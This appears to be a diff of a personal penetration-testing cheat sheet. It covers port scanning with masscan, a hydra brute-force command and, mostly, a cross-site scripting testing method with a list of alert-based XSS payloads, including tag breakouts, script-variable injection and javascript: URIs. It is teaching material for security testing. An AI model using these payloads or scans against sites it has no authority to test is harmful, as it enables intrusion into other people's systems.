@@ -1,6 +1,7 @@
 # Common Commands/Techniques I Use Frequently (In no particular order)
 
-## Enumeration
+Enumeration
+======
 ### Port Scanning
 - `IP=x.x.x.x`
 - `sudo masscan -p1-65535 $IP --rate=1000 -e tun0 > ports`
@@ -62,15 +63,18 @@ so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rock
 
 ## Web App Testing
 ### XSS
-The first thing to do is to look for parameters or input fields on the page, put your unique and easy to find test data in (And submit it or whatever) and then inspect the resultant page to see wher your test data has ended up in the code. Understanding the context where it ends up will determine what type of payload you'll need to use (Try things like ending the tag that it ends up in for example).
+The first thing to do is to look for parameters or input fields on the page, put your unique and easy to find test data in (And submit it or whatever) and then inspect the resultant page to see wher your test data has ended up in the code. Understanding the context where it ends up will determine what type of payload you'll need to use (Try things like closing the tag/variable that it ends up in and/or commenting out any code after the payload, bypassing filtering/escaping/CSP for example). 
 Things to consider:
-- When dealing with an API, check the content type in the response headers. If its text/html as oppesed to text/javascript etc. it could be susceptible to XSS. Send the request in a browser and then do the usual to see if the html can be altered etc.
-#### Payloads
-- `"><u>ghostbugg`
+- When dealing with an API, check the content type in the response headers. If its text/html as opposed to text/javascript etc. it could be susceptible to XSS. Send the request in a browser (Visit https://myapi.com/check.php?username=ghostbugg) and then do the usual to see if the html can be altered (Try https://myapi.com/check.php?username=<u>ghostbugg for example) etc.
+- If your input ends up in a variable of a script or a span tag you can right click on it in the browser dev tools to edit it as HTML to see how the input is interpreted.
+#### Common Example Payloads
+- `"><u>ghostbugg` Initial test to see if we can add HTML to the page
+- `;//` Javascript comment to stop any code after our payload being executed (Use only when required)
 - `<script>alert(1337)</script>`
-- `<script>alert(1337);//</script>`
+- `ghostbugg';alert(1337);//` Payload for scenario described above where our input ended up in a variable (Declared with apostrophes around it) within a script tag
 - `<img src=xxxx onerror=alert(1337)>`
-- `<a href=javascript:alert(1337)>ghostbugg`
+- `</textarea><img src=xxxx onmouseover=alert(1337)>`
+- `<a href=javascript:alert(1337)>`
 - `<iframe src=javascript:alert(1337)>`
 - `<object data="data:text/html,<script>alert(1337)</script>"></object>`
 - `<script src=data:text/javascript,alert(1337)></script>`
